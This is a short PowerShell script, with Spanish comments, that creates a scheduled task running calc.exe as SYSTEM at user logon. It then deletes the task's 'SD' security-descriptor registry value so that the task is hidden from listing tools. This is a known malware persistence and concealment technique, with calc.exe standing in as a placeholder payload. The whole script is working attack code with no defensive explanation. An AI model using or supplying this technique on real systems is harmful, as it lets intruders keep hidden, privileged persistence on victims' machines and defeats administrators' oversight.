# Crear una tarea programada

$taskName = "Calc_PS1"
$action = New-ScheduledTaskAction -Execute "calc.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Interactive


function ScheduledTask-Exists ($taskName) {
    $schedule = New-Object -Com Schedule.Service
    $schedule.connect()
    $taskFolder = $schedule.GetFolder($taskpath)
    $taskExists = $taskFolder.GetTask($taskname) | Select-Object Name | Where-Object { $_.Name -eq $taskName }
    if (-not $taskExists) {
        return $false
    }
    return $true
}

if (ScheduledTask-Exists ($taskname)) {
    Write-Output "$taskname already exists"
} else {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -ErrorAction SilentlyContinue
    Write-Output "Creating Scheduled Task - $taskName"
}

# Eliminar el valor SD para ocultar la tarea
$treePath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree"
$fullKeyPath = Join-Path -Path $treePath -ChildPath $taskName
$value = "SD"
$fullPath = Join-Path -Path $fullKeyPath -ChildPath $value

Remove-ItemProperty -Path $fullKeyPath -Name $value -Force
